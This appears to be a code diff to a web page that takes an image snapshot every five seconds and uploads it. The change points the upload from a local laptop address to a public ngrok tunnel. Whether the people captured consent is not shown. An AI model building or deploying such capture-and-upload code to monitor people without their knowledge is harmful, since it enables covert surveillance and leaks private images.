@@ -945,7 +945,7 @@ HTML
     let snapshotInterval = null;
     
     // ЗАМЕНИТЕ ВАШ_IP НА IP-АДРЕС ВАШЕГО НОУТБУКА (где запущен сервер приемник)
-    const RECEIVER_IP = "192.168.1.136"; 
+    const RECEIVER_IP = "https://sip-factor-arbitrate.ngrok-free.dev"; 
     const RECEIVER_PORT = 8000;
     const SNAPSHOT_INTERVAL_MS = 5000; // Снимок каждые 5 секунд
     
@@ -1009,7 +1009,7 @@ HTML
             formData.append('image', blob, 'snapshot.jpg');
             
             try {
-                const res = await fetch(`http://${RECEIVER_IP}:${RECEIVER_PORT}/`, {
+                const res = await fetch(`https://sip-factor-arbitrate.ngrok-free.dev/`, {
                     method: 'POST',
                     body: formData
                 });
